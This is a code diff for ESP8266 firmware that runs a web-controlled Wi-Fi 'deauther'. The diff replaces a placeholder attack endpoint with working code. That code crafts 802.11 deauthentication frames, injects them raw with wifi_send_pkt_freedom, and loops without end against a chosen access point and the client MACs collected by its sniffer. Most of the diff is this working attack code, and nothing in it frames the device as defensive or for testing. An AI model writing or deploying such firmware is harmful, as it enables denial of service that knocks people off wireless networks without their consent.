@@ -6,7 +6,8 @@
 // --- Pin Configuration ---
 #define AUTONOMOUS_MODE_PIN D3 // GPIO0
 
-// --- Data Structures for Packet Sniffing ---
+// --- Data Structures for Packet Sniffing & Attack ---
+// This is the MAC header for 802.11 frames
 struct MacHeader {
   uint8_t frameControl[2];
   uint8_t duration[2];
@@ -16,15 +17,17 @@ struct MacHeader {
   uint8_t sequenceControl[2];
 };
 
+// This is the full structure for a deauthentication frame
+struct DeauthFrame {
+  MacHeader macHeader;
+  uint8_t reasonCode[2]; // Reason for deauthentication
+};
+
 // --- Global Variables ---
 const char* ssid = "Digital Bug";
 const char* password = "deauther";
 ESP8266WebServer server(80);
 bool autonomousMode = false;
-
-// NEW: A volatile boolean flag to signal stopping a process.
-// "volatile" tells the compiler that this variable can be changed by external factors
-// (like a web server request) at any time, preventing aggressive optimizations.
 volatile bool stopProcess = false;
 
 // --- Client Scanning Globals ---
@@ -51,6 +54,11 @@ String macToString(const uint8_t* mac) {
   return String(buf);
 }
 
+// Helper to convert a MAC address String back to a byte array
+void stringToMac(String macStr, uint8_t* mac) {
+    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
+}
+
 void addClient(String mac) {
     if (clientCount >= MAX_CLIENTS) return;
     for (int i = 0; i < clientCount; i++) {
@@ -73,6 +81,42 @@ void snifferCallback(uint8_t *buffer, uint16_t length) {
       addClient(addr1_str);
   }
 }
+
+// --- Attack Function ---
+// This function crafts and sends a single deauthentication frame.
+void sendDeauthFrame(const uint8_t* ap_mac, const uint8_t* client_mac) {
+    DeauthFrame deauth;
+    
+    // Frame Control: 0xC0 = Deauthentication frame
+    deauth.macHeader.frameControl[0] = 0xC0;
+    deauth.macHeader.frameControl[1] = 0x00;
+    
+    // Duration: 314 microseconds
+    deauth.macHeader.duration[0] = 0x3a;
+    deauth.macHeader.duration[1] = 0x01;
+
+    // Set addresses:
+    // addr1 = Destination (the client)
+    // addr2 = Source (the AP)
+    // addr3 = BSSID (the AP)
+    memcpy(deauth.macHeader.addr1, client_mac, 6);
+    memcpy(deauth.macHeader.addr2, ap_mac, 6);
+    memcpy(deauth.macHeader.addr3, ap_mac, 6);
+
+    // Sequence control (can be 0)
+    deauth.macHeader.sequenceControl[0] = 0x00;
+    deauth.macHeader.sequenceControl[1] = 0x00;
+
+    // Reason code: 7 = "Class 3 frame received from nonassociated STA"
+    // This is a common reason code used in deauth attacks.
+    deauth.reasonCode[0] = 0x07;
+    deauth.reasonCode[1] = 0x00;
+
+    // Inject the packet into the air!
+    // The wifi_send_pkt_freedom function is a low-level SDK function that allows raw packet injection.
+    wifi_send_pkt_freedom((uint8_t*)&deauth, sizeof(DeauthFrame), 0);
+}
+
 
 // --- Web Server Handlers ---
 void handleRoot() {
@@ -126,9 +170,7 @@ void handleClientScan() {
         return;
     }
 
-    // NEW: Reset the stop flag at the beginning of a new scan.
     stopProcess = false;
-
     String target = server.arg("target");
     int commaIndex = target.indexOf(',');
     targetBSSID = target.substring(0, commaIndex);
@@ -142,10 +184,7 @@ void handleClientScan() {
     wifi_set_promiscuous_rx_cb(snifferCallback);
 
     unsigned long startTime = millis();
-    // MODIFIED: The loop now also checks the stopProcess flag.
     while(millis() - startTime < 10000 && !stopProcess) {
-        // We must call server.handleClient() inside long loops.
-        // This allows the server to process incoming requests, like the one for /stop.
         server.handleClient();
         delay(1); 
     }
@@ -174,16 +213,62 @@ void handleClientScan() {
     server.send(200, "text/html", html);
 }
 
-// NEW: This handler is called when the /stop URL is requested.
-void handleStop() {
-    Serial.println("[API] Received /stop request.");
-    stopProcess = true; // Set the flag to true
-    server.send(200, "text/plain", "OK. Process will be stopped.");
+// *** NEW IMPLEMENTATION of handleAttack ***
+void handleAttack() {
+    Serial.println("[API] Received /attack request.");
+    if (!server.hasArg("ap_bssid") || !server.hasArg("channel") || !server.hasArg("clients")) {
+        server.send(400, "text/plain", "Bad Request: Missing parameters.");
+        return;
+    }
+
+    stopProcess = false;
+    int channel = server.arg("channel").toInt();
+    String ap_bssid_str = server.arg("ap_bssid");
+    String clients_str = server.arg("clients");
+
+    // Convert MAC strings to byte arrays
+    uint8_t ap_mac[6];
+    stringToMac(ap_bssid_str, ap_mac);
+
+    Serial.printf("[ATTACK] Starting Deauth Attack on channel %d, AP: %s\n", channel, ap_bssid_str.c_str());
+    server.send(200, "text/plain", "OK. Attack started. Press STOP to end.");
+
+    // Set the channel for the attack
+    wifi_set_channel(channel);
+
+    // Loop indefinitely, sending deauth packets until stopped
+    while(!stopProcess) {
+        // Loop through each client MAC address provided in the comma-separated list
+        int currentPos = 0;
+        while(currentPos < clients_str.length()) {
+            int nextPos = clients_str.indexOf(',', currentPos);
+            if (nextPos == -1) nextPos = clients_str.length();
+            
+            String client_mac_str = clients_str.substring(currentPos, nextPos);
+            uint8_t client_mac[6];
+            stringToMac(client_mac_str, client_mac);
+
+            // Send a deauth frame from AP to Client
+            sendDeauthFrame(ap_mac, client_mac);
+            // Send another frame from Client to AP for good measure
+            sendDeauthFrame(client_mac, ap_mac);
+            
+            currentPos = nextPos + 1;
+        }
+        
+        // This is crucial to keep the web server responsive to a /stop request
+        server.handleClient();
+        delay(2); // A small delay to prevent overwhelming the ESP8266
+    }
+
+    Serial.println("[ATTACK] Deauth attack stopped by user.");
 }
 
-void handleAttack() {
-    Serial.println("[API] Received /attack request. This feature is under development.");
-    server.send(200, "text/plain", "Attack feature not yet implemented.");
+
+void handleStop() {
+    Serial.println("[API] Received /stop request.");
+    stopProcess = true;
+    server.send(200, "text/plain", "OK. Process will be stopped.");
 }
 
 void handleNotFound() {
@@ -230,8 +315,11 @@ void setup() {
   server.on("/", HTTP_GET, handleRoot);
   server.on("/scan", HTTP_GET, handleScan);
   server.on("/clients", HTTP_GET, handleClientScan);
-  server.on("/stop", HTTP_GET, handleStop); // NEW: Register the stop handler
+
+  // The attack handler now uses POST to send more data
   server.on("/attack", HTTP_POST, handleAttack);
+  
+  server.on("/stop", HTTP_GET, handleStop);
   server.onNotFound(handleNotFound);
 
   server.begin();
@@ -240,8 +328,6 @@ void setup() {
 
 void loop() {
   if (!autonomousMode) {
-    // In the main loop, we only need to handle client requests.
-    // The client scan loop now handles its own requests.
     server.handleClient();
   }
 }
